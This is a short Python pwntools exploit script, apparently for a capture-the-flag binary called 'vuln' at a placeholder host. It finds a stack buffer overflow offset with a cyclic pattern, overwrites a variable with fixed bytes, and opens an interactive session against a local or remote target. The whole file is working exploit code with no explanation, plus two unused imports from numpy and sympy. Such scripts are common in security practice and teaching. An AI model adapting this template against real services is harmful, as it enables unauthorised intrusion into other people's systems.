from numpy import var
from sympy import cyclotomic_poly
from pwn import *

context(os='linux', arch='amd64')
# context.log_level = 'critical'


host, port = 'vuln.com', 5555
elf = ELF('vuln')


def conn(argv=[]):
    if args.REMOTE:
        return remote(host, port)
    elif args.GDB:
        return gdb.debug([elf.path]+argv)
    else:
        return process([elf.path]+argv)


def exploit():
    payload = b''
    payload += cyclic(0x100)
    r = conn([payload.decode()])
    r.recvuntil(b'you got ')
    var_modified = int(r.recvuntil(b'\n')[:-1], 16)
    offset = cyclic_find(var_modified)
    payload = b''
    payload += cyclic(offset)
    payload += b'\x64\x63\x62\x61'
    r = conn([payload.decode()])
    r.interactive()


if __name__ == '__main__':
    exploit()
